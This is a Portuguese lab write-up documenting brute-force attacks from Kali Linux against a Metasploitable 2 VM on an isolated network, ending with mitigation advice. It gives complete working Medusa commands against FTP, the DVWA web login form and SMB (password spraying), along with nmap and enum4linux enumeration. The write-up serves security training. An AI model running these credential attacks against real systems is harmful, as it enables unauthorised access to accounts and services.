# Documentação Prática — Força Bruta com Kali Linux e Medusa

**Autora:** Emilly Lamas  
**Ambiente:** VirtualBox (Rede Interna / *Host-Only*)  
**Máquina Atacante:** Kali Linux (`docimpreto@kali`)  
**Máquina Alvo:** Metasploitable 2 (`192.168.56.101`)  

---

## 1. Preparação do Alvo (Metasploitable 2)

Inicialização da VM **Metasploitable 2** em rede isolada *Host-Only* no VirtualBox e identificação das credenciais padrão exibidas na tela de login (`msfadmin` / `msfadmin`).


Verificação de rede e conectividade a partir do Kali Linux:

```bash
ip a
ping -c 4 192.168.56.101
nmap -sV -p 21,80,139,445 192.168.56.101
```

---

## 2. Criação das Wordlists no Kali Linux

Criação dos arquivos de texto com listas enxutas de usuários e senhas para os testes controlados.

### Lista de usuários (`user.txt`)

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > user.txt
cat user.txt
```


### Lista de senhas (`pass.txt`)

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
cat pass.txt
```


---

## 3. Cenário 1 — Força Bruta no Serviço FTP (Porta 21)

Execução do **Medusa** contra o serviço FTP do Metasploitable 2 (`192.168.56.101`), utilizando `-U` para o arquivo de usuários, `-P` (maiúsculo) para o arquivo de senhas, `-M ftp` para o módulo FTP e `-t 6` para 6 *threads* simultâneas:

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6
```


### Validação do Acesso

Após a identificação do par `msfadmin:msfadmin` pelo Medusa, validação manual da conexão via cliente FTP:

```bash
ftp 192.168.56.101
```

---

## 4. Cenário 2 — Automação em Formulário Web (DVWA)

Com o nível de segurança do **DVWA** configurado em `Low` e o cookie `PHPSESSID` capturado no navegador:

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m COOKIE:"PHPSESSID=SEU_SESSION_ID_AQUI; security=low" -t 4
```

---

## 5. Cenário 3 — Enumeração e Password Spraying em SMB

Enumeração de usuários disponíveis no serviço SMB seguida de *password spraying* (testando uma senha única com `-p` minúsculo contra toda a lista de usuários `-U`):

```bash
enum4linux -U 192.168.56.101
medusa -h 192.168.56.101 -U user.txt -p msfadmin -M smbnt -t 4
```

---

## 6. Recomendações de Mitigação

* **Política de senhas fortes:** eliminar credenciais padrão (`msfadmin`, `admin`, `123456`) e exigir senhas longas e complexas.
* **Bloqueio e limitação de tentativas:** configurar *account lockout*, *rate limiting* e ferramentas como **Fail2Ban** para bloquear IPs após falhas consecutivas.
* **Substituição de protocolos inseguros:** migrar de FTP para **SFTP** ou **FTPS** e adotar **HTTPS** para tráfego web.
* **Autenticação Multifator (MFA):** exigir segundo fator de autenticação em serviços críticos e administrativos.
* **Monitoramento de logs:** auditar registros de autenticação (`/var/log/auth.log` e logs de aplicação) para detecção rápida de padrões de força bruta.
